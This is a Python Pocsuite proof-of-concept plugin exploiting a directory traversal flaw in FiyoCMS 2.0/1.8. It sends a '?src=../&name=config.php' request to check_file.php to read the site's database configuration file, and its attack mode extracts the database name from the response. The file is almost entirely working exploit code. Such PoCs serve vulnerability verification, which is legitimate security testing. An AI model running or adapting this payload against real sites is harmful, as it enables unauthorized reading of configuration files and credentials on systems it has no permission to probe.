#!/usr/bin/python
# -*- coding:utf-8 -*-

import string
import random
import time
import re
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register

def get_url(url, refer):
    try:
        httpreq = req.Session()
        headers = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language" : "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "refer"
        }
        resp = httpreq.get(url, headers=headers)
    except Exception as ex:
        resp = None
    return resp

class TestPOC(POCBase):
    name = 'fiyocms2.0 1.8 dir-traversal Vulnerability'
    vulID = '0'
    author = ['cws6']
    vulType = 'dir-traversal'
    version = '1'
    references = ['http://p0desta.com/2018/10/15/fiyocms代码审计']
    desc = '''fiyocms dapur/apps/app_theme/libs/check_file.php 存在目录穿越漏洞可读取数据库配置文件'''

    vulDate = '2018-10-15'
    createDate = '2019-04-13'
    updateDate = '2019-04-13'

    appName = 'fiyocms'
    appVersion = '2.0 1.8'
    appPowerLink = 'https://github.com/FiyoCMS/FiyoCMS'
    samples = ['re']

    
    def _attack(self):
        """attack mode"""
        result = {}
        payload1 = '/dapur/apps/app_theme/libs/check_file.php'
        payload = '?src=../&name=config.php'
        refer = self.url
        resp = get_url(self.url + payload1 + payload,refer)
        time.sleep(1)
        dbname1 = re.findall("'(.*?)';", resp.content)
        if resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['Database'] = {}
            result['Database']['DBname'] = dbname1[0]
        return self.parse_output(result)
        
    def _verify(self):
        """verify mode"""
        result = {}
        payload1 = '/dapur/apps/app_theme/libs/check_file.php'
        payload = '?src=../&name=config.php'
        refer = self.url
        resp = get_url(self.url + payload1 + payload,refer)
        time.sleep(1)
        if resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

